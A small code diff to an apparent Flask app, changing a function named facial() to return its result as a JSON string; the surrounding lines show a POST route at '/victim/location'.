@@ -124,7 +124,7 @@ def facial():
     except:
         res['status'] = '404'
     print(res)
-    return res
+    return json.dumps(res)
 
 
 @app.route('/victim/location',methods=['POST'])
